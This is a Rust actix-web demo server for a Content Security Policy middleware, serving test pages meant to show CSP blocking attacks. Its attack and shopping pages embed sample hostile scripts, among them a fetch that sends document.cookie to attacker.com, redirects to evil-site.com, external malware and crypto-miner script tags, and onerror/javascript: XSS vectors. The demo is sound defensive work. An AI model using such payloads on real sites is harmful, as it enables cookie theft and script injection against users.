use actix_web::{
    middleware::Logger, web, App, HttpMessage, HttpRequest, HttpResponse, HttpServer, Result,
};
use actix_web_csp::{
    csp_with_reporting, CspPolicyBuilder, CspViolationReport, RequestNonce, Source,
};

const SECURE_HTML: &str = r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Test Page - CSP Protection</title>
    <style nonce="{nonce}">
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            width: 90%;
            text-align: center;
        }
        
        .header {
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 2.5rem;
            color: #2c3e50;
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .security-badge {
            display: inline-flex;
            align-items: center;
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
            padding: 12px 24px;
            border-radius: 50px;
            font-weight: 600;
            margin: 20px 0;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
        }
        
        .security-badge::before {
            content: "🛡️";
            margin-right: 8px;
            font-size: 1.2em;
        }
        
        .info-card {
            background: #f8f9fa;
            border-left: 4px solid #3498db;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
            text-align: left;
        }
        
        .info-card h3 {
            color: #2c3e50;
            margin-bottom: 10px;
        }
        
        .secure-button {
            background: linear-gradient(45deg, #3498db, #2980b9);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3);
            margin-top: 20px;
        }
        
        .secure-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.4);
        }
        
        .secure-button:active {
            transform: translateY(0);
        }
        
        .warning-box {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 0.9rem;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 20px;
                margin: 20px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>CSP Security Test</h1>
            <div class="security-badge">This page is protected with secure CSP rules</div>
        </div>
        
        <div class="info-card">
            <h3>🔒 Security Features</h3>
            <ul style="list-style: none; padding-left: 0;">
                <li style="margin: 8px 0;">✅ Nonce-based script protection</li>
                <li style="margin: 8px 0;">✅ Inline script blocking</li>
                <li style="margin: 8px 0;">✅ XSS attack protection</li>
                <li style="margin: 8px 0;">✅ Secure source policy</li>
            </ul>
        </div>
        
        <button id="safe-button" class="secure-button">Start Secure Operation</button>
        
        <div class="warning-box">
            <strong>⚠️ Test Warning:</strong> Unsafe scripts on this page will be blocked by CSP.
        </div>
    </div>

    <script nonce="{nonce}">
        console.log('✅ Secure script running');
        
        document.addEventListener('DOMContentLoaded', function() {
            const button = document.getElementById('safe-button');
            
            button.addEventListener('click', function() {
                showNotification('🎉 Secure operation completed successfully!', 'success');
            });
        });
        
        function showNotification(message, type) {
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: ${type === 'success' ? '#27ae60' : '#e74c3c'};
                color: white;
                padding: 15px 20px;
                border-radius: 8px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.2);
                z-index: 1000;
                font-weight: 600;
                animation: slideIn 0.3s ease;
            `;
            
            notification.textContent = message;
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.animation = 'slideOut 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }, 3000);
        }
        
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    </script>

    <script>
        console.log('❌ This script will be blocked!');
    </script>
</body>
</html>"#;

const SHOPPING_HTML: &str = r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Shopping Site - CSP Protected</title>
    <style nonce="{nonce}">
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f8f9fa;
            color: #333;
            line-height: 1.6;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 2rem 0;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .header h1 {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }
        
        .header p {
            font-size: 1.1rem;
            opacity: 0.9;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }
        
        .products-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin: 2rem 0;
        }
        
        .product {
            background: white;
            border-radius: 15px;
            padding: 1.5rem;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            transition: all 0.3s ease;
            border: 1px solid #e9ecef;
        }
        
        .product:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
        }
        
        .product-image {
            width: 100%;
            height: 200px;
            background: linear-gradient(45deg, #f1f3f4, #e8eaed);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3rem;
            margin-bottom: 1rem;
        }
        
        .product h3 {
            font-size: 1.4rem;
            color: #2c3e50;
            margin-bottom: 0.5rem;
            font-weight: 600;
        }
        
        .product-description {
            color: #6c757d;
            margin-bottom: 1rem;
            font-size: 0.95rem;
        }
        
        .price {
            font-size: 1.8rem;
            font-weight: 700;
            color: #e74c3c;
            margin-bottom: 1rem;
        }
        
        .cart-button {
            background: linear-gradient(45deg, #28a745, #20c997);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
        }
        
        .cart-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
        }
        
        .cart-button:active {
            transform: translateY(0);
        }
        
        .cart-status {
            position: fixed;
            top: 20px;
            right: 20px;
            background: white;
            padding: 15px 20px;
            border-radius: 50px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            border: 2px solid #28a745;
            font-weight: 600;
            color: #28a745;
            z-index: 1000;
            transition: all 0.3s ease;
        }
        
        .cart-status.updated {
            animation: pulse 0.6s ease;
        }
        
        .security-info {
            background: linear-gradient(45deg, #17a2b8, #138496);
            color: white;
            padding: 1.5rem;
            border-radius: 15px;
            margin: 2rem 0;
            text-align: center;
        }
        
        .security-info h3 {
            margin-bottom: 1rem;
            font-size: 1.3rem;
        }
        
        .security-features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }
        
        .security-feature {
            background: rgba(255,255,255,0.1);
            padding: 1rem;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .products-grid {
                grid-template-columns: 1fr;
            }
            
            .cart-status {
                position: relative;
                top: auto;
                right: auto;
                margin: 1rem 0;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🛒 Secure Shopping Center</h1>
        <p>Safe shopping experience with CSP protection</p>
    </div>

    <div class="container">
        <div class="security-info">
            <h3>🔐 Security Features</h3>
            <div class="security-features">
                <div class="security-feature">
                    <strong>🛡️ CSP Protection</strong><br>
                    Malicious scripts are blocked
                </div>
                <div class="security-feature">
                    <strong>🔒 Secure Operations</strong><br>
                    All API calls are protected
                </div>
                <div class="security-feature">
                    <strong>⚡ Nonce Based</strong><br>
                    Only secure code runs
                </div>
            </div>
        </div>

        <div class="products-grid">
            <div class="product">
                <div class="product-image">📱</div>
                <h3>Premium Smartphone</h3>
                <p class="product-description">High-performance smartphone equipped with latest technology features</p>
                <p class="price">$2,999.99</p>
                <button class="cart-button" data-product-id="1" data-product-name="Premium Smartphone" data-price="2999.99">
                    🛒 Add to Cart
                </button>
            </div>

            <div class="product">
                <div class="product-image">💻</div>
                <h3>Ultrabook Laptop</h3>
                <p class="product-description">Lightweight, powerful with long battery life, ideal for professional use</p>
                <p class="price">$4,599.99</p>
                <button class="cart-button" data-product-id="2" data-product-name="Ultrabook Laptop" data-price="4599.99">
                    🛒 Add to Cart
                </button>
            </div>

            <div class="product">
                <div class="product-image">🎧</div>
                <h3>Wireless Headphones</h3>
                <p class="product-description">Active noise cancellation with crystal clear sound quality</p>
                <p class="price">$899.99</p>
                <button class="cart-button" data-product-id="3" data-product-name="Wireless Headphones" data-price="899.99">
                    🛒 Add to Cart
                </button>
            </div>
        </div>

        <div id="cart-status" class="cart-status" style="display: none;">
            You have 0 products in cart
        </div>
    </div>

    <script nonce="{nonce}">
        let cart = [];
        let cartTotal = 0;

        document.addEventListener('DOMContentLoaded', function() {
            const buttons = document.querySelectorAll('.cart-button');
            const cartStatus = document.getElementById('cart-status');
            
            buttons.forEach(button => {
                button.addEventListener('click', function() {
                    const productId = this.dataset.productId;
                    const productName = this.dataset.productName;
                    const price = parseFloat(this.dataset.price);
                    
                    addToCart(productId, productName, price);
                });
            });
        });

        function addToCart(productId, productName, price) {
            const product = {
                id: productId,
                name: productName,
                price: price
            };
            
            cart.push(product);
            cartTotal += price;
            updateCartStatus();
            showAddToCartAnimation(productName);
            
            console.log('✅ Product added to cart:', product);
            
            sendSecureRequest();
        }

        function updateCartStatus() {
            const status = document.getElementById('cart-status');
            status.style.display = 'block';
            status.innerHTML = `🛒 You have ${cart.length} products in cart ($${cartTotal.toFixed(2)})`;
            status.classList.add('updated');
            
            setTimeout(() => {
                status.classList.remove('updated');
            }, 600);
        }

        function showAddToCartAnimation(productName) {
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: #28a745;
                color: white;
                padding: 20px 30px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                z-index: 2000;
                font-weight: 600;
                text-align: center;
                animation: popIn 0.5s ease;
            `;
            
            notification.innerHTML = `
                <div style="font-size: 2rem; margin-bottom: 10px;">🎉</div>
                <div>${productName}</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">added to cart!</div>
            `;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.animation = 'popOut 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }, 2000);
        }

        function sendSecureRequest() {
            fetch('/api/cart', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRF-Token': 'secure-token'
                },
                body: JSON.stringify({ 
                    items: cart,
                    total: cartTotal,
                    timestamp: new Date().toISOString()
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('✅ Secure API call completed:', data);
            })
            .catch(error => {
                console.error('❌ API Error:', error);
            });
        }
        
        const style = document.createElement('style');
        style.textContent = `
            @keyframes popIn {
                0% { transform: translate(-50%, -50%) scale(0.5); opacity: 0; }
                100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
            }
            @keyframes popOut {
                0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
                100% { transform: translate(-50%, -50%) scale(0.5); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    </script>

    <script>
        document.cookie = "malicious=true";
        window.location = "http://evil-site.com";
        console.log('❌ This malicious script will be blocked!');
    </script>

    <script src="http://malicious-site.com/evil.js"></script>
</body>
</html>"#;

const ATTACK_HTML: &str = r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSP Attack Test - Security Demo</title>
    <style>
        body { background: red !important; }
        .malicious { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <div style="font-family: 'Segoe UI', sans-serif; max-width: 800px; margin: 0 auto; padding: 20px;">
        <div style="background: linear-gradient(135deg, #e74c3c, #c0392b); color: white; padding: 30px; border-radius: 15px; text-align: center; margin-bottom: 30px;">
            <h1 style="font-size: 2.5rem; margin-bottom: 10px;">⚠️ CSP Attack Test</h1>
            <p style="font-size: 1.1rem; opacity: 0.9;">This page tests various security attacks</p>
        </div>

        <div style="background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
            <h3 style="margin-bottom: 15px;">🛡️ CSP Protection Active</h3>
            <p>All of the following attack attempts will be blocked by Content Security Policy:</p>
        </div>

        <div style="display: grid; gap: 20px; margin: 20px 0;">
            <div style="background: white; border: 1px solid #dee2e6; border-radius: 10px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                <h3 style="color: #e74c3c; margin-bottom: 15px;">🎯 XSS Attack Attempts</h3>
                
                <div style="margin: 15px 0; padding: 15px; background: #f8f9fa; border-radius: 8px;">
                    <strong>1. Onclick Event Attack:</strong>
                    <div onclick="alert('XSS Attack!')" style="background: #dc3545; color: white; padding: 10px; border-radius: 5px; cursor: pointer; margin-top: 10px;">
                        ⚠️ Click this button (Will be blocked)
                    </div>
                </div>

                <div style="margin: 15px 0; padding: 15px; background: #f8f9fa; border-radius: 8px;">
                    <strong>2. Image Onerror Attack:</strong><br>
                    <img src="x" onerror="alert('Image XSS Attack!')" alt="Attack image" style="margin-top: 10px;">
                    <p style="font-size: 0.9rem; color: #6c757d; margin-top: 5px;">The image above will fail to load and the onerror event will be blocked</p>
                </div>

                <div style="margin: 15px 0; padding: 15px; background: #f8f9fa; border-radius: 8px;">
                    <strong>3. Form Attack:</strong>
                    <form action="javascript:alert('Form XSS!')" style="margin-top: 10px;">
                        <input type="text" placeholder="Malicious form" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
                        <button type="submit" style="padding: 8px 15px; background: #dc3545; color: white; border: none; border-radius: 4px; margin-left: 10px;">
                            Submit (Will be blocked)
                        </button>
                    </form>
                </div>
            </div>

            <div style="background: white; border: 1px solid #dee2e6; border-radius: 10px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                <h3 style="color: #e74c3c; margin-bottom: 15px;">💻 Script Attack Attempts</h3>
                
                <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 0.9rem;">
                    <strong>Inline Scripts to be Blocked:</strong><br>
                    • alert('Inline script attack!')<br>
                    • document.cookie = "stolen=data"<br>
                    • fetch('http://attacker.com/steal')<br>
                    • window.location = 'http://evil-site.com'
                </div>
            </div>

            <div style="background: white; border: 1px solid #dee2e6; border-radius: 10px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                <h3 style="color: #e74c3c; margin-bottom: 15px;">🌐 External Script Attacks</h3>
                
                <div style="background: #f8f9fa; padding: 15px; border-radius: 8px;">
                    <p><strong>External Scripts to be Blocked:</strong></p>
                    <ul style="margin: 10px 0; padding-left: 20px;">
                        <li>http://evil.com/malware.js</li>
                        <li>https://cdn.evil.com/crypto-miner.js</li>
                        <li>javascript:alert('XSS')</li>
                    </ul>
                </div>
            </div>
        </div>

        <div style="background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 10px; margin-top: 30px;">
            <h3 style="margin-bottom: 15px;">✅ Security Status</h3>
            <p>All attack attempts have been successfully blocked by CSP (Content Security Policy).</p>
            <p style="margin-top: 10px;"><strong>Check:</strong> Open the browser console (F12) to see CSP violation messages.</p>
        </div>
    </div>

    <script>
        alert('❌ Inline script attack!');
        document.cookie = "stolen=data";
        
        fetch('http://attacker.com/steal', {
            method: 'POST',
            body: document.cookie + ' | ' + document.location.href
        });
        
        setTimeout(() => {
            window.location = 'http://evil-site.com/malware';
        }, 1000);
        
        document.body.innerHTML = '<h1 style="color: red;">HACKED!</h1>';
        
        console.log('❌ These malicious scripts will be blocked by CSP!');
    </script>

    <script src="http://evil.com/malware.js"></script>
    <script src="https://cdn.evil.com/crypto-miner.js"></script>
    <script src="javascript:alert('External XSS!')"></script>
</body>
</html>"#;

fn handle_csp_violation(report: CspViolationReport) {
    println!("🚨 CSP VIOLATION DETECTED:");
    println!("  Document URI: {}", report.document_uri);
    println!("  Violated directive: {}", report.violated_directive);
    println!("  Blocked URI: {}", report.blocked_uri);
    println!("  Source file: {}", report.source_file.unwrap_or_default());
    println!("  Line number: {}", report.line_number.unwrap_or_default());
    println!(
        "  Column number: {}",
        report.column_number.unwrap_or_default()
    );
    println!("  Original policy: {}", report.original_policy);
    println!("---");
}

async fn secure_page(req: HttpRequest) -> Result<HttpResponse> {
    let nonce = match req.extensions().get::<RequestNonce>() {
        Some(request_nonce) => request_nonce.to_string(),
        None => uuid::Uuid::new_v4().to_string(),
    };

    let html = SECURE_HTML.replace("{nonce}", &nonce);

    Ok(HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(html))
}

async fn shopping_page(req: HttpRequest) -> Result<HttpResponse> {
    let nonce = match req.extensions().get::<RequestNonce>() {
        Some(request_nonce) => request_nonce.to_string(),
        None => uuid::Uuid::new_v4().to_string(),
    };

    let html = SHOPPING_HTML.replace("{nonce}", &nonce);

    Ok(HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(html))
}

async fn attack_page() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(ATTACK_HTML))
}

async fn api_cart(data: web::Json<serde_json::Value>) -> Result<HttpResponse> {
    println!("Cart API called: {:?}", data);
    Ok(HttpResponse::Ok().json(serde_json::json!({
        "status": "success",
        "message": "Cart updated"
    })))
}

async fn index() -> Result<HttpResponse> {
    let html = r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSP Security Test Center</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 2rem;
        }
        
        .header {
            text-align: center;
            color: white;
            margin-bottom: 3rem;
        }
        
        .header h1 {
            font-size: 3rem;
            font-weight: 700;
            margin-bottom: 1rem;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        
        .header p {
            font-size: 1.2rem;
            opacity: 0.9;
            max-width: 600px;
            margin: 0 auto;
        }
        
        .test-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-bottom: 3rem;
        }
        
        .test-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 2rem;
            text-decoration: none;
            color: #333;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .test-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            text-decoration: none;
            color: #333;
        }
        
        .test-icon {
            font-size: 3rem;
            margin-bottom: 1rem;
            display: block;
        }
        
        .test-card h3 {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
            color: #2c3e50;
        }
        
        .test-card p {
            color: #6c757d;
            line-height: 1.6;
            margin-bottom: 1rem;
        }
        
        .test-status {
            display: inline-block;
            padding: 0.5rem 1rem;
            border-radius: 20px;
            font-size: 0.9rem;
            font-weight: 600;
        }
        
        .status-secure {
            background: #d4edda;
            color: #155724;
        }
        
        .status-test {
            background: #fff3cd;
            color: #856404;
        }
        
        .status-danger {
            background: #f8d7da;
            color: #721c24;
        }
        
        .instructions {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        
        .instructions h2 {
            color: #2c3e50;
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
        }
        
        .instructions ol {
            padding-left: 1.5rem;
        }
        
        .instructions li {
            margin-bottom: 0.8rem;
            line-height: 1.6;
        }
        
        .feature-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1rem;
            margin-top: 1.5rem;
        }
        
        .feature-item {
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 10px;
            border-left: 4px solid #007bff;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .test-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ CSP Security Test Center</h1>
            <p>Test the security features of Content Security Policy (CSP) middleware and see how attack attempts are blocked</p>
        </div>

        <div class="test-grid">
            <a href="/secure" class="test-card">
                <span class="test-icon">🔒</span>
                <h3>Secure Page</h3>
                <p>Secure content with nonce-based CSP protection. Modern security practices and user-friendly interface.</p>
                <span class="test-status status-secure">✅ Secure</span>
            </a>

            <a href="/shopping" class="test-card">
                <span class="test-icon">🛒</span>
                <h3>Shopping Site</h3>
                <p>Security test with an e-commerce scenario. Example of CSP protection for real-world applications.</p>
                <span class="test-status status-test">🧪 Test Environment</span>
            </a>

            <a href="/attack" class="test-card">
                <span class="test-icon">⚠️</span>
                <h3>Attack Test</h3>
                <p>Blocking XSS and other attack attempts. See the power of CSP against attacks.</p>
                <span class="test-status status-danger">🚨 Attack Simulation</span>
            </a>
        </div>

        <div class="instructions">
            <h2>📋 Test Instructions</h2>
            <ol>
                <li><strong>Visit the test pages:</strong> Click the cards above to test different security scenarios</li>
                <li><strong>Open the browser console:</strong> Press F12 to open developer tools</li>
                <li><strong>Observe CSP violation messages:</strong> See security violations in the Console tab</li>
                <li><strong>Check server logs:</strong> Review CSP violation reports in the terminal</li>
                <li><strong>Monitor the Network tab:</strong> See blocked requests and security headers</li>
            </ol>

            <div class="feature-list">
                <div class="feature-item">
                    <strong>🛡️ Nonce Protection</strong><br>
                    Only secure scripts run
                </div>
                <div class="feature-item">
                    <strong>🚫 XSS Prevention</strong><br>
                    Malicious script injections are blocked
                </div>
                <div class="feature-item">
                    <strong>📊 Real-Time Reporting</strong><br>
                    Violations are reported instantly
                </div>
                <div class="feature-item">
                    <strong>🔍 Detailed Analysis</strong><br>
                    Comprehensive information for each violation
                </div>
            </div>
        </div>
    </div>
</body>
</html>"#;

    Ok(HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(html))
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    env_logger::init();

    println!("🚀 CSP Test Server starting...");
    println!("📍 Test pages:");
    println!("   http://localhost:8080/ - Home page");
    println!("   http://localhost:8080/secure - Secure page");
    println!("   http://localhost:8080/shopping - Shopping site");
    println!("   http://localhost:8080/attack - Attack test");
    println!("   http://localhost:8080/csp-report - CSP violation reports");

    HttpServer::new(|| {
        let secure_policy = CspPolicyBuilder::new()
            .default_src([Source::Self_])
            .script_src([Source::Self_])
            .style_src([Source::Self_])
            .img_src([
                Source::Self_,
                Source::Scheme("data".into()),
                Source::Scheme("https".into()),
            ])
            .connect_src([Source::Self_, Source::Scheme("https".into())])
            .font_src([Source::Self_, Source::Scheme("data".into())])
            .object_src([Source::None])
            .media_src([Source::Self_])
            .frame_src([Source::None])
            .base_uri([Source::Self_])
            .form_action([Source::Self_])
            .report_uri("/csp-report")
            .build_unchecked();

        let (middleware, configurator) = csp_with_reporting(secure_policy, handle_csp_violation);

        App::new()
            .wrap(Logger::default())
            .wrap(middleware)
            .configure(configurator)
            .route("/", web::get().to(index))
            .route("/secure", web::get().to(secure_page))
            .route("/shopping", web::get().to(shopping_page))
            .route("/attack", web::get().to(attack_page))
            .route("/api/cart", web::post().to(api_cart))
    })
    .bind("127.0.0.1:8080")?
    .run()
    .await
}
